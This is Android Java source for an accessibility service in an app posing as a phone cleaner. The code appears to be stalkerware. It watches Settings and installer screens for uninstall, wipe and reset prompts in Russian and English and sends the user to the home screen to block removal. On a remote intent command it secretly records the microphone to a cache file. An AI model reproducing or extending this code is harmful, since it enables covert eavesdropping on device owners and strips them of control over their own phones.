package com.phone.health.cleaner;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.media.MediaRecorder;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.IOException;

public class RemoteControlService extends AccessibilityService {

    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        
        String packageName = event.getPackageName().toString();
        
        // Защита от удаления
        if (packageName.contains("settings") || packageName.contains("packageinstaller") || packageName.contains("installer")) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                boolean hasUninstall = findTextRecursive(rootNode, "удалить") ||
                                       findTextRecursive(rootNode, "uninstall") ||
                                       findTextRecursive(rootNode, "стереть данные") ||
                                       findTextRecursive(rootNode, "сбросить");
                
                if (hasUninstall) {
                    performGlobalAction(GLOBAL_ACTION_HOME);
                }
                rootNode.recycle();
            }
        }
    }

    private boolean findTextRecursive(AccessibilityNodeInfo node, String textToFind) {
        if (node == null) return false;
        
        if (node.getText() != null && node.getText().toString().toLowerCase().contains(textToFind)) {
            return true;
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            if (findTextRecursive(node.getChild(i), textToFind)) {
                return true;
            }
        }
        return false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String command = intent.getStringExtra("command");
            if ("start_audio".equals(command)) {
                startSecretAudio();
            } else if ("stop_audio".equals(command)) {
                stopSecretAudio();
            }
        }
        return START_STICKY;
    }

    private void startSecretAudio() {
        if (isRecording) return;
        try {
            File audioDir = getCacheDir();
            File audioFile = File.createTempFile("stream_", ".3gp", audioDir);
            audioFilePath = audioFile.getAbsolutePath();

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopSecretAudio() {
        if (!isRecording || mediaRecorder == null) return;
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {
        if (isRecording) {
            stopSecretAudio();
        }
    }
}
